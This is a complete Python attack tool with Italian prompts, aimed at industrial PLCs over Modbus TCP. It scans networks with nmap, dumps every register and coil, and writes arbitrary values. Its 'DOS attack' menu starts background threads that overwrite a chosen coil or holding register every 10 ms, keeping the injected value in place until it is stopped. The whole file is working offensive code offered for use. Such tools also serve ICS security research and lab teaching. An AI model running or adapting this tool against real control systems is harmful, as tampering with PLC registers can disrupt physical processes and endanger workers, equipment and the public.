#!/usr/bin/python3
import nmap
import re
from prettytable import PrettyTable
from pymodbus.client import ModbusTcpClient
from pymodbus import ExceptionResponse
from pymodbus.exceptions import ModbusException
import logging
import threading
import time

logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#thread attivi
threads = []

def print_menu():
    print("\n")
    print(30 * "-" , "MENU" , 30 * "-")
    print("1. Scansione range di indirizzi IP con nmap")
    print("2. Scansione registri delle PLC")
    print("3. Lettura dei valori contenuti nei registri delle PLC")
    print("4. Modifica dei valori contenuti nei registri delle PLC")
    print("5. Attacco DOS a un registro della PLC")
    print("6. Gestione degli attacchi DOS")
    print("7. Esci")
    print(66 * "-")

#scansione range di indirizzi ip con nmap
#ritorna una lista di indirizzi ip con la porta 502 aperta
def nmap_scan():

    finish = False
    while not finish:
        ip_range = input("\nInserisci il range di indirizzi IP da scansionare, nel formato IP/mask (premi solo invio per tornare al menu): ")

        if ip_range == "":
            return
        #formato indirizzo ip errato
        if bool(re.match(r'^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\/(3[0-2]|[1-2]?\d)$', ip_range)) == False:
            print("\nFormato non valido")
            continue
        else:
            finish = True
    nm = nmap.PortScanner()
    print("\nScansione in corso...\n")
    nm.scan(ip_range, '1-1023')
    
    #tabella di output a video
    t = PrettyTable(['IP', 'Port', 'Protocol', 'Name', 'State'])
    with open('nmap_export.json', 'w') as f:

        if(len(nm.all_hosts()) == 0):
            print("Nessun host raggiungibile")
            return
        f.write('{\n\t"hosts": [\n')
        for host in nm.all_hosts():
            if len(nm[host].all_protocols()) > 0:
                f.write("\t\t{\n")
                f.write('\t\t\t"ip": "' + host + '", \n')
                f.write('\t\t\t"status": "' + nm[host]['status']['state'] + '", \n')
                f.write('\t\t\t"ports": [\n')
                for proto in nm[host].all_protocols():
                    lport = nm[host][proto].keys()
                    for port in lport:
                        f.write("\t\t\t\t{ ")
                        f.write('"port": "' + str(port) + '", ')
                        f.write('"protocol": "' + proto + '", ')
                        f.write('"name": "' + nm[host][proto][port]['name'] + '", ')
                        f.write('"state": "' + nm[host][proto][port]['state'] + '"')
                        f.write("}, \n")
                        #aggiungo riga alla tabella
                        t.add_row([host, port, proto, nm[host][proto][port]['name'], nm[host][proto][port]['state']])

                #elimina l'ultima virgola
                f.seek(f.tell() - 3)
                f.write("\n\t\t\t]\n\t\t},\n ")
        #elimina l'ultima virgola
        f.seek(f.tell() - 3)
        f.write("\n\t]\n}")
    #stampo la tabella
    print("\nElenco delle porte aperte:")
    print(t)
    print("\nReport dettagliato scritto in nmap_export.json.")
    return


def plc_scan():

    ip_addr = input("\nInserisci l'indirizzo IP della PLC a cui vuoi connetterti: ")
    client = ModbusTcpClient(ip_addr, 502)
    print("\nConnessione in corso...")
    while client.connect() == False:
        print("\nConnessione fallita all'indirizzo " + ip_addr)
        ip_addr = input("Inserisci un nuovo indirizzo IP: ")
        client = ModbusTcpClient(ip_addr, 502)
        print("\nConnessione in corso...")
    
    print("\nConnessione stabilita con successo all'indirizzo " + ip_addr)
    print("\nScansione in corso...\n")
    t = PrettyTable(['Tipo', 'Indirizzo Modbus', 'Indirizzo PLC', 'Data Size', 'Valore'])
    with open('plc_export.json', 'w') as f:
        f.write('{\n\t"registers": [\n')
        #scansione discrete inputs
        for i in range(0, 1600):
            try:
                response = client.read_discrete_inputs(i, 1)
                if response.isError():
                    continue
                elif isinstance(response, ExceptionResponse):
                    continue
                elif isinstance(response, ModbusException):
                    continue
                else:
                    plc_address = "%IX" + str(i//8) + "." + str(i%8)
                    f.write("\t\t{ ")
                    f.write('"type": "discrete input", ')
                    f.write('"modbus_address": "' + str(i) + '", ')
                    f.write('"plc_address": "' + plc_address + '", ')
                    f.write('"data_size": "1 bit", ')
                    f.write('"value": "' + str(response.bits[0]) + '"')
                    f.write("}, \n")
                    t.add_row(["discrete input", i, plc_address, "1 bit", response.bits[0]])
            except ExceptionResponse:
                pass
        #scansione registri di input
        for i in range(0, 1024):
            try:
                response = client.read_input_registers(i, 1)
                if response.isError():
                    continue
                elif isinstance(response, ExceptionResponse):
                    continue
                elif isinstance(response, ModbusException):
                    continue
                else:
                    plc_address = "%IW" + str(i)
                    f.write("\t\t{ ")
                    f.write('"type": "input register", ')
                    f.write('"modbus_address": "' + str(i) + '", ')
                    f.write('"plc_address": "' + plc_address + '", ')
                    f.write('"data_size": "16 bit", ')
                    f.write('"value": "' + str(response.registers[0]) + '"')
                    f.write("}, \n")
                    t.add_row(["input register", i, plc_address, "16 bit", response.registers[0]])
            except ExceptionResponse:
                pass
        #scansione registri di holding da 16 bit
        for i in range(0, 2048):
            try:
                response = client.read_holding_registers(i, 1)
                if response.isError():
                    continue
                elif isinstance(response, ExceptionResponse):
                    continue
                elif isinstance(response, ModbusException):
                    continue
                else:
                    if i < 1024:
                        plc_address = "%QW" + str(i)
                    else:
                        plc_address = "%MW" + str(i-1024)
                    f.write("\t\t{ ")
                    f.write('"type": "holding register", ')
                    f.write('"modbus_address": "' + str(i) + '", ')
                    f.write('"plc_address": "' + plc_address + '", ')
                    f.write('"data_size": "16 bit", ')
                    f.write('"value": "' + str(response.registers[0]) + '"')
                    f.write("}, \n")
                    t.add_row(["holding register", i, plc_address, "16 bit", response.registers[0]])
            except ExceptionResponse:
                pass
        #scansione registri di holding da 32 bit
        for i in range(2048, 4096, 2):
            try:
                response = client.read_holding_registers(i, 1)
                if response.isError():
                    continue
                elif isinstance(response, ExceptionResponse):
                    continue
                elif isinstance(response, ModbusException):
                    continue
                else:
                    plc_address = "%MD" + str((i-2048)//2)
                    f.write("\t\t{ ")
                    f.write('"type": "holding register", ')
                    f.write('"modbus_address": "' + str(i) + '", ')
                    f.write('"plc_address": "' + plc_address + '", ')
                    f.write('"data_size": "32 bit", ')
                    f.write('"value": "' + str(response.registers[0]) + '"')
                    f.write("}, \n")
                    t.add_row(["holding register", i, plc_address, "32 bit", response.registers[0]])
            except ExceptionResponse:
                pass
        #scansione registri di holding da 64 bit
        for i in range(4096, 8192, 4):
            try:
                response = client.read_holding_registers(i, 1)
                if response.isError():
                    continue
                elif isinstance(response, ExceptionResponse):
                    continue
                elif isinstance(response, ModbusException):
                    continue
                else:
                    plc_address = "%ML" + str((i-4096)//4)
                    f.write("\t\t{ ")
                    f.write('"type": "holding register", ')
                    f.write('"modbus_address": "' + str(i) + '", ')
                    f.write('"plc_address": "' + plc_address + '", ')
                    f.write('"data_size": "64 bit", ')
                    f.write('"value": "' + str(response.registers[0]) + '"')
                    f.write("}, \n")
                    t.add_row(["holding register", i, plc_address, "64 bit", response.registers[0]])
            except ExceptionResponse:
                pass
        #scansione coils
        for i in range(0, 1600):
            try:
                response = client.read_coils(i, 1)
                if response.isError():
                    continue
                elif isinstance(response, ExceptionResponse):
                    continue
                elif isinstance(response, ModbusException):
                    continue
                else:
                    plc_address = "%QX" + str(i//8) + "." + str(i%8)
                    f.write("\t\t{ ")
                    f.write('"type": "coil", ')
                    f.write('"modbus_address": "' + str(i) + '", ')
                    f.write('"plc_address": "' + plc_address + '", ')
                    f.write('"data_size": "1 bit", ')
                    f.write('"value": "' + str(response.bits[0]) + '"')
                    f.write("}, \n")
                    t.add_row(["coil", i, plc_address, "1 bit", response.bits[0]])
            except ExceptionResponse:
                pass
        #elimina l'ultima virgola
        f.seek(f.tell() - 3)
        f.write("\n\t]\n}")
    print("\nElenco dei registri della PLC:")
    #stampo la tabella
    print(t)
    print("\nReport dettagliato scritto in plc_export.json.")
    client.close()
    
def read_register():
    ip_addr = input("\nInserisci l'indirizzo IP della PLC a cui vuoi connetterti: ")
    client = ModbusTcpClient(ip_addr, 502)
    print("\nConnessione in corso...")
    while client.connect() == False:
        print("\nConnessione fallita all'indirizzo " + ip_addr)
        ip_addr = input("Inserisci un nuovo indirizzo IP: ")
        client = ModbusTcpClient(ip_addr, 502)
        print("\nConnessione in corso...")
    
    print("\nConnessione stabilita con successo all'indirizzo " + ip_addr)
    valid = False
    while not valid:
        print("\n------------------------------------")
        print("Che tipo di registro vuoi leggere?\n")
        print("1. Discrete input")
        print("2. Input register")
        print("3. Holding register")
        print("4. Coil")
        print("5. Torna al menu iniziale")
        print("------------------------------------")
        try:
            choice = int(input("\nScegli il tipo di registro da leggere [1-5]: "))
            if choice in range(1, 6):
                valid = True
        except ValueError:
            print("Scelta non valida")
            continue
    #lettura discrete input
    if choice == 1:
        address = -1
        while address not in range(0, 1600):
            try:
                address = int(input("\nInserisci l'indirizzo del discrete input da leggere [0-1599]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        response = client.read_discrete_inputs(address, 1)
        if response.isError():
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella lettura del registro")
            return
        print("\nValore del discrete input " + str(address) + ": " + str(response.bits[0]))
    #lettura input register
    elif choice == 2:
        address = -1
        while address not in range(0, 1024):
            try:
                address = int(input("\nInserisci l'indirizzo dell'input register da leggere [0-1023]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        response = client.read_input_registers(address, 1)
        if response.isError():
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella lettura del registro")
            return
        print("\nValore dell'input register " + str(address) + ": " + str(response.registers[0]))
    #lettura holding register
    elif choice == 3:
        address = -1
        while address not in range(0, 8192):
            try:
                address = int(input("\nInserisci l'indirizzo dell'holding register da leggere [0-8191]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        response = client.read_holding_registers(address, 1)
        if response.isError():
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella lettura del registro")
            return
        print("\nValore dell'holding register " + str(address) + ": " + str(response.registers[0]))
    #lettura coil
    elif choice == 4:
        address = -1
        while address not in range(0, 1600):
            try:
                address = int(input("\nInserisci l'indirizzo del coil da leggere [0-1599]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        response = client.read_coils(address, 1)
        if response.isError():
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella lettura del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella lettura del registro")
            return
        print("\nValore del coil " + str(address) + ": " + str(response.bits[0]))
    client.close()
    return

def write_register():
    ip_addr = input("\nInserisci l'indirizzo IP della PLC a cui vuoi connetterti: ")
    client = ModbusTcpClient(ip_addr, 502)
    print("\nConnessione in corso...")
    while client.connect() == False:
        print("\nConnessione fallita all'indirizzo " + ip_addr)
        ip_addr = input("Inserisci un nuovo indirizzo IP: ")
        client = ModbusTcpClient(ip_addr, 502)
        print("\nConnessione in corso...")
    
    print("\nConnessione stabilita con successo all'indirizzo " + ip_addr)
    valid = False
    while not valid:
        print("\n------------------------------------")
        print("Che tipo di registro vuoi modificare?\n")
        print("1. Discrete input")
        print("2. Holding register")
        print("3. Coil")
        print("4. Torna al menu iniziale")
        print("------------------------------------")
        try:
            choice = int(input("\nScegli il tipo di registro da modificare [1-4]: "))
            if choice in range(1, 5):
                valid = True
        except ValueError:
            print("Scelta non valida")
            continue

    #modifica discrete input, possono essere modificati solo nel range 800-1599, i primi 800 sono di sola lettura
    if choice == 1:
        address = -1
        while address not in range(800, 1600):
            try:
                address = int(input("\nInserisci l'indirizzo del discrete input da modificare [800-1599]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        value = -1
        while value not in range(0, 2):
            try:
                value = int(input("\nInserisci il valore del discrete input [0-1]: "))
            except ValueError:
                print("Valore non valido")
                value = -1
                continue
        response = client.write_coil(address, value)
        if response.isError():
            print("\nErrore nella modifica del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella modifica del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella modifica del registro")
            return
        print("\nDiscrete input " + str(address) + " modificato con successo")

    #modifica holding register
    elif choice == 2:
        address = -1
        while address not in range(0, 8192):
            try:
                address = int(input("\nInserisci l'indirizzo dell'holding register da modificare [0-8191]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        value = -1
        #registro a 16 bit
        if address in range(0, 2048):
            while value not in range(0, 65536):
                try:
                    value = int(input("\nInserisci il valore dell'holding register [0-65535]: "))
                except ValueError:
                    print("Valore non valido")
                    value = -1
                    continue
        #registro a 32 bit
        elif address in range(2048, 4096):
            while value not in range(0, 4294967296):
                try:
                    value = int(input("\nInserisci il valore dell'holding register [0-4294967295]: "))
                except ValueError:
                    print("Valore non valido")
                    value = -1
                    continue
        #registro a 64 bit
        elif address in range(4096, 8192):
            while value not in range(0, 18446744073709551616):
                try:
                    value = int(input("\nInserisci il valore dell'holding register [0-18446744073709551615]: "))
                except ValueError:
                    print("Valore non valido")
                    value = -1
                    continue
        response = client.write_register(address, value)
        if response.isError():
            print("\nErrore nella modifica del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella modifica del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella modifica del registro")
            return
        print("\nHolding register " + str(address) + " modificato con successo")

    #modifica coil
    elif choice == 3:
        address = -1
        while address not in range(0, 1600):
            try:
                address = int(input("\nInserisci l'indirizzo del coil da modificare [0-1599]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        value = -1
        while value not in range(0, 2):
            try:
                value = int(input("\nInserisci il valore del coil [0-1]: "))
            except ValueError:
                print("Valore non valido")
                value = -1
                continue
        response = client.write_coil(address, value)
        if response.isError():
            print("\nErrore nella modifica del registro")
            return
        elif isinstance(response, ExceptionResponse):
            print("\nErrore nella modifica del registro")
            return
        elif isinstance(response, ModbusException):
            print("\nErrore nella modifica del registro")
            return
        print("\nCoil " + str(address) + " modificato con successo")

def dos_attack():
    ip_addr = input("\nInserisci l'indirizzo IP della PLC a cui vuoi connetterti: ")
    client = ModbusTcpClient(ip_addr, 502)
    print("\nConnessione in corso...")
    while client.connect() == False:
        print("\nConnessione fallita all'indirizzo " + ip_addr)
        ip_addr = input("Inserisci un nuovo indirizzo IP: ")
        client = ModbusTcpClient(ip_addr, 502)
        print("\nConnessione in corso...")
    
    print("\nConnessione stabilita con successo all'indirizzo " + ip_addr)
    valid = False
    while not valid:
        print("\n------------------------------------")
        print("Che tipo di registro vuoi attaccare?\n")
        print("1. Discrete input")
        print("2. Holding register")
        print("3. Coil")
        print("4. Torna al menu iniziale")
        print("------------------------------------")
        try:
            choice = int(input("\nScegli il tipo di registro da attaccare [1-4]: "))
            if choice in range(1, 5):
                valid = True
        except ValueError:
            print("Scelta non valida")
            continue

    #attacco discrete input, possono essere attaccati solo nel range 800-1599, i primi 800 sono di sola lettura
    if choice == 1:
        address = -1
        while address not in range(800, 1600):
            try:
                address = int(input("\nInserisci l'indirizzo del discrete input da attaccare [800-1599]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        value = -1
        while value not in range(0, 2):
            try:
                value = int(input("\nInserisci il valore da iniettare nel discrete input [0-1]: "))
            except ValueError:
                print("Valore non valido")
                value = -1
                continue
        #funzione che viene utilizzata nelle thread di attacco
        def attack():
            t = threading.current_thread()
            while getattr(t, "do_run", True):
                client.write_coil(address, value)
                time.sleep(0.01)

        t = threading.Thread(target=attack)
        t.name = "Set discrete input " + str(address) + " to " + str(value)
        t.start()
        #aggiungo il thread alla lista dei thread attivi
        threads.append((t.name, t))
        #threads.update({t.native_id: (t.name, t)})
        print("\nAttacco in corso al discrete input " + str(address) + " con valore " + str(value))
        print("Puoi fermare l'attacco dal menu iniziale")
    #attacco holding register
    elif choice == 2:
        address = -1
        while address not in range(0, 8192):
            try:
                address = int(input("\nInserisci l'indirizzo dell'holding register da attaccare [0-8191]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        value = -1
        #registro a 16 bit
        if address in range(0, 2048):
            while value not in range(0, 65536):
                try:
                    value = int(input("\nInserisci il valore da iniettare nell'holding register [0-65535]: "))
                except ValueError:
                    print("Valore non valido")
                    value = -1
                    continue
        #registro a 32 bit
        elif address in range(2048, 4096):
            while value not in range(0, 4294967296):
                try:
                    value = int(input("\nInserisci il valore da iniettare nell'holding register [0-4294967295]: "))
                except ValueError:
                    print("Valore non valido")
                    value = -1
                    continue
        #registro a 64 bit
        elif address in range(4096, 8192):
            while value not in range(0, 18446744073709551616):
                try:
                    value = int(input("\nInserisci il valore da iniettare nell'holding register [0-18446744073709551615]: "))
                except ValueError:
                    print("Valore non valido")
                    value = -1
                    continue
        def attack():
            t = threading.current_thread()
            while getattr(t, "do_run", True):
                client.write_register(address, value)
                time.sleep(0.01)

        t = threading.Thread(target=attack)
        t.name = "Set holding register " + str(address) + " to " + str(value)
        t.start()
        #aggiungo il thread alla lista dei thread attivi
        threads.append((t.name, t))
        #threads.update({t.native_id: (t.name, t)})
        print("\nAttacco in corso all'holding register " + str(address) + " con valore " + str(value))
        print("Puoi fermare l'attacco dal menu iniziale")
    #attacco coil
    elif choice == 3:
        address = -1
        while address not in range(0, 1600):
            try:
                address = int(input("\nInserisci l'indirizzo del coil da attaccare [0-1599]: "))
            except ValueError:
                print("Indirizzo non valido")
                address = -1
                continue
        value = -1
        while value not in range(0, 2):
            try:
                value = int(input("\nInserisci il valore da iniettare nel coil [0-1]: "))
            except ValueError:
                print("Valore non valido")
                value = -1
                continue
        def attack():
            t = threading.current_thread()
            while getattr(t, "do_run", True):
                client.write_coil(address, value)
                time.sleep(0.01)

        t = threading.Thread(target=attack)
        t.name = "Set coil " + str(address) + " to " + str(bool(value))
        t.start()
        #aggiungo il thread alla lista dei thread attivi
        threads.append((t.name, t))
        #threads.update({t.native_id: (t.name, t)})
        print("\nAttacco in corso al coil " + str(address) + " con valore " + str(bool(value)))
        print("Puoi fermare l'attacco dal menu iniziale")

def manage_threads():
    if len(threads) == 0:
        print("\nNon ci sono attacchi in corso")
        return
    print("\nElenco degli attacchi in corso:")
    t = PrettyTable(['ID thread', 'Nome thread'])
    for i in range(1, len(threads)+1):
        t.add_row([i, threads[i-1][0]])
    print(t)
    valid = False
    while not valid:
        try:
            choice = int(input("\nInserisci il numero del thread da fermare (0 per tornare al menu): "))
            if choice in range(len(threads)+1):
                valid = True
            elif choice == 0:
                return
            else:
                print("Scelta non valida")
        except ValueError:
            print("Scelta non valida")
            continue
    threads[choice-1][1].do_run = False
    threads[choice-1][1].join()
    del threads[choice-1]
    print("\nThread fermato con successo")

if __name__ == "__main__":
    choice = 0
    while choice != 7:
        print_menu()
        try:
            choice = int(input("Inserisci l'operazione da svolgere [1-7]: "))
            if choice == 1:
                print("\nScansione range di indirizzi IP con nmap")
                nmap_scan()
            elif choice == 2:
                print("\nScansione registri delle PLC")
                plc_scan()
            elif choice == 3:
                print("\nLettura dei valori contenuti nei registri delle PLC")
                read_register()
            elif choice == 4:
                print("\nModifica dei valori contenuti nei registri delle PLC")
                write_register()
            elif choice == 5:
                print("\nAttacco DOS a un registro della PLC")
                dos_attack()
            elif choice == 6:
                print("\nGestione degli attacchi DOS")
                manage_threads()
            elif choice == 7:
                print("\nEsci")
            else:
                print("Scelta non valida")
        except ValueError:
            print("Scelta non valida")

